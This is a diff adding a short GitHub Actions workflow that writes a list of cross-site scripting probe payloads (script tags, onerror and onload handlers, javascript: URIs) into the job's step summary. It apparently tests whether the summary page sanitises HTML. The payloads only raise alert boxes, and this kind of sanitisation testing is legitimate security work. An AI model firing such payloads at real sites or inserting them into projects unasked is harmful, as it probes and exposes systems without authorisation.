@@ -1,0 +1,25 @@
+name: XSS Summary Test
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  xss-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write XSS to step summary
+        run: |
+          {
+            echo "## XSS Test"
+            echo "<img src=x onerror=alert(document.domain)>"
+            echo "<svg onload=alert(document.domain)>"
+            echo "<script>alert(document.domain)</script>"
+            echo "<a href=javascript:alert(1)>JS Link</a>"
+            echo "<details open ontoggle=alert(1)><summary>Toggle me</summary></details>"
+            echo "<div style=background:url(javascript:alert(1))>Style</div>"
+            echo "<iframe src=javascript:alert(1)></iframe>"
+            echo "<math href=javascript:alert(1)>Math</math>"
+            echo "<video><source onerror=alert(1)></video>"
+          } >> "$GITHUB_STEP_SUMMARY"
+
